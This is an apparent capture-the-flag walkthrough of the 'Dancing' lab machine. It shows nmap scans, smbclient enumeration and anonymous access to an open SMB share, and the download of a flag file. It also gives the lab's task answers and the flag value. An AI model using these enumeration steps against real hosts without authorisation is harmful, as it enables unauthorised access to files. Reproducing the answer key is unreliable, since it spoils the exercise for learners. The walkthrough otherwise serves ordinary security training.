## Walkthrough

- performed nmap scans

```
┌─[birb@parrot]─[~]
└──╼ $nmap 10.129.163.162
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 15:15 IST
Nmap scan report for 10.129.163.162
Host is up (0.47s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 45.44 seconds
```

```
┌─[birb@parrot]─[~]
└──╼ $nmap 10.129.163.162 -sC -sV -p 135,139,445
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 15:17 IST
Nmap scan report for 10.129.163.162
Host is up (0.36s latency).

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-16T13:47:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.65 seconds
```

- got smb shares list using `smbclient -L ip`

```
┌─[birb@parrot]─[~]
└──╼ $smbclient -L 10.129.163.162
Password for [WORKGROUP\birb]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

- connected to `WorkShares` smb share (no password required)

```
┌─[birb@parrot]─[~]
└──╼ $smbclient //10.129.163.162/WorkShares
Password for [WORKGROUP\birb]:
Try "help" to get a list of possible commands.
smb: \>
```

- NOTE: instead of connecting to the samba share, you can mount the share to a local mount point

```
mount -t cifs //10.129.163.162/WorkShares /path/to/mount/point
```

- transfered `flag.txt` to local machine using `get`

```
WorkShares/
├── Amy.J
│   └── worknotes.txt
└── James.P
    └── flag.txt

2 directories, 2 files
```

```
smb: \> get James.P\flag.txt 
getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> quit
```

- got the flag

```
┌─[birb@parrot]─[~]
└──╼ $cat James.P\\flag.txt 
5f61c10dffbc77a704d76016a22f1664
```

## Tasks

**What does the 3-letter acronym SMB stand for?**

=> Server Message Block

**What port does SMB use to operate at?**

=> 445

**What is the service name for port 445 that came up in our Nmap scan?**

=> microsoft-ds

**What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?**

=> -L

**How many shares are there on Dancing?**

=> 4

**What is the name of the share we are able to access in the end with a blank password?**

=> WorkShares

**What is the command we can use within the SMB shell to download the files we find?**

=> get

**Submit root flag**

=> 5f61c10dffbc77a704d76016a22f1664
